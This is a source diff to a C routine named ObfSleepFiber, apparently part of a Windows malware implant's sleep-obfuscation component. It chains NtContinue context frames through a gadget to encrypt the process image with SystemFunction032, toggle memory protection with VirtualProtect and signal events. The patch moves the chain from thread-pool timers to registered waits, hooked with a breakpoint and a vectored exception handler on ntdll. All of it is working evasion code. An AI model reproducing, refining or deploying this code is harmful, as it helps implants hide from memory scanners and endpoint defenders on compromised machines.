-											__builtin_memcpy( Cp3, &Ctx, sizeof( CONTEXT ) );
-											Cp3->ContextFlags = CONTEXT_FULL;
-											Cp3->Rip  = U_PTR( Gdg );
-											Cp3->Rsp -= U_PTR( sizeof( PVOID ) );
-											Cp3->Rax  = U_PTR( Api.RtlCopyMappedMemory );
-											Cp3->Rcx  = U_PTR( & NtCurrentTeb()->NtTib );
-											Cp3->Rdx  = U_PTR( & Oli );
-											Cp3->R8   = U_PTR( sizeof( NT_TIB ) );
+										/* NtSetContextThread */
+										__builtin_memcpy( St2, &Ctx, sizeof( CONTEXT ) );
+										St2->ContextFlags = CONTEXT_FULL;
+										Cap->ContextFlags = CONTEXT_FULL;
+										St2->Rip  = U_PTR( Gdg );
+										St2->Rsp -= U_PTR( sizeof( PVOID ) );
+										St2->Rax  = U_PTR( Api.NtSetContextThread );
+										St2->Rcx  = U_PTR( Src );
+										St2->Rdx  = U_PTR( Cap );
 
-											/* NtSetContextThread */
-											__builtin_memcpy( St2, &Ctx, sizeof( CONTEXT ) );
-											St2->ContextFlags = CONTEXT_FULL;
-											Cap->ContextFlags = CONTEXT_FULL;
-											St2->Rip  = U_PTR( Gdg );
-											St2->Rsp -= U_PTR( sizeof( PVOID ) );
-											St2->Rax  = U_PTR( Api.NtSetContextThread );
-											St2->Rcx  = U_PTR( Src );
-											St2->Rdx  = U_PTR( Cap );
+										/* SystemFunction032 */
+										__builtin_memcpy( Dec, &Ctx, sizeof( CONTEXT ) );
+										Dec->ContextFlags = CONTEXT_FULL;
+										Dec->Rip  = U_PTR( Gdg );
+										Dec->Rsp -= U_PTR( sizeof( PVOID ) );
+										Dec->Rax  = U_PTR( Api.SystemFunction032 );
+										Dec->Rcx  = U_PTR( &Buf );
+										Dec->Rdx  = U_PTR( &Key );
 
-											/* SystemFunction032 */
-											__builtin_memcpy( Dec, &Ctx, sizeof( CONTEXT ) );
-											Dec->ContextFlags = CONTEXT_FULL;
-											Dec->Rip  = U_PTR( Gdg );
-											Dec->Rsp -= U_PTR( sizeof( PVOID ) );
-											Dec->Rax  = U_PTR( Api.SystemFunction032 );
-											Dec->Rcx  = U_PTR( &Buf );
-											Dec->Rdx  = U_PTR( &Key );
+										/* VirtualProtect */
+										__builtin_memcpy( Res, &Ctx, sizeof( CONTEXT ) );
+										Res->ContextFlags = CONTEXT_FULL;
+										Res->Rip  = U_PTR( Gdg );
+										Res->Rsp -= U_PTR( sizeof( PVOID ) );
+										Res->Rax  = U_PTR( Api.VirtualProtect );
+										Res->Rcx  = U_PTR( Img );
+										Res->Rdx  = U_PTR( XLn );
+										Res->R8   = U_PTR( PAGE_EXECUTE_READ );
+										Res->R9   = U_PTR( &Prt );
 
-											/* VirtualProtect */
-											__builtin_memcpy( Res, &Ctx, sizeof( CONTEXT ) );
-											Res->ContextFlags = CONTEXT_FULL;
-											Res->Rip  = U_PTR( Gdg );
-											Res->Rsp -= U_PTR( sizeof( PVOID ) );
-											Res->Rax  = U_PTR( Api.VirtualProtect );
-											Res->Rcx  = U_PTR( Img );
-											Res->Rdx  = U_PTR( XLn );
-											Res->R8   = U_PTR( PAGE_EXECUTE_READ );
-											Res->R9   = U_PTR( &Prt );
+										/* SetEvent */
+										__builtin_memcpy( End, &Ctx, sizeof( CONTEXT ) );
+										End->ContextFlags = CONTEXT_FULL;
+										End->Rip  = U_PTR( Gdg );
+										End->Rsp -= U_PTR( sizeof( PVOID ) );
+										End->Rax  = U_PTR( Api.SetEvent );
+										End->Rcx  = U_PTR( Ev3 );
 
-											/* SetEvent */
-											__builtin_memcpy( End, &Ctx, sizeof( CONTEXT ) );
-											End->ContextFlags = CONTEXT_FULL;
-											End->Rip  = U_PTR( Gdg );
-											End->Rsp -= U_PTR( sizeof( PVOID ) );
-											End->Rax  = U_PTR( Api.SetEvent );
-											End->Rcx  = U_PTR( Ev3 );
+										/* Query all the API calls in the order in which they need to run */
+										if ( ! NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.NtContinue, Beg, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
+										if ( ! NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.NtContinue, Set, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
+										if ( ! NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.NtContinue, Enc, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
+										if ( ! NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.NtContinue, Gt1, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
+										if ( ! NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.NtContinue, Cp1, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
+										if ( ! NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.NtContinue, Cp2, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
+										if ( ! NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.NtContinue, St1, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
+										if ( ! NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.NtContinue, Sev, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
+										if ( ! NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.NtContinue, Blk, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
+										if ( ! NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.NtContinue, Cp3, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
+										if ( ! NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.NtContinue, St2, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
+										if ( ! NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.NtContinue, Dec, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
+										if ( ! NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.NtContinue, Res, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
+										if ( ! NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.NtContinue, End, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
 
-											/* Query all the API calls in the order in which they need to run */
-											if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Beg, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
-											if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Set, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
-											if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Enc, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
-											if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Gt1, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
-											if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Cp1, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
-											if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Cp2, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
-											if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, St1, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
-											if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Sev, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
-											if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Blk, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
-											if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Cp3, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
-											if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, St2, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
-											if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Dec, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
-											if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Res, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
-											if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, End, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
+										/* Remove the breakpoint on ntdll!TpAllocTimer */
+										RemoveBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCWAIT ) ) );
 
-											/* Remove the breakpoint on ntdll!TpAllocTimer */
-											RemoveBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );
+										/* Remove the Vectored Exception Handler! */
+										if ( Api.RtlRemoveVectoredExceptionHandler( Veh ) ) {
 
-											/* Remove the Vectored Exception Handler! */
-											if ( Api.RtlRemoveVectoredExceptionHandler( Veh ) ) {
+											/* Adjust the offset before setting our new frame */
+											Ctx.Rsp -= U_PTR( sizeof( PVOID ) );
 
-												/* Adjust the offset before setting our new frame */
-												Ctx.Rsp -= U_PTR( sizeof( PVOID ) );
-
-												/* Execute and await the frame results! */
-												Api.NtSignalAndWaitForSingleObject( Ev2, Ev3, FALSE, NULL ); 
-											};
+											/* Execute and await the frame results! */
+											Api.NtSignalAndWaitForSingleObject( Ev2, Ev3, FALSE, NULL ); 
 										};
 									};
 								};
@@ -1068,8 +1065,11 @@ static D_SEC( E ) VOID WINAPI ObfSleepFiber( _In_ PFIBER_PARAM Parameter )
 			if ( Ev3 != NULL ) {
 				Api.NtClose( Ev3 );
 			};
+			if ( Ev4 != NULL ) {
+				Api.NtClose( Ev4 );
+			};
 			if ( Que != NULL ) {
-				Api.RtlDeleteTimerQueue( Que ); 
+				Api.RtlDeregisterWait( Que );
 			};
 			if ( Cap != NULL ) {
 				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Cap );
@@ -1118,7 +1118,7 @@ static D_SEC( E ) VOID WINAPI ObfSleepFiber( _In_ PFIBER_PARAM Parameter )
 			};
 			if ( Veh != NULL ) {
 				/* Remove the breakpoint on ntdll!TpAllocTimer */
-				RemoveBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );
+				RemoveBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCWAIT ) ) );
 
 				/* Remove the Vectored Exception Handler */
 				Api.RtlRemoveVectoredExceptionHandler( Veh );
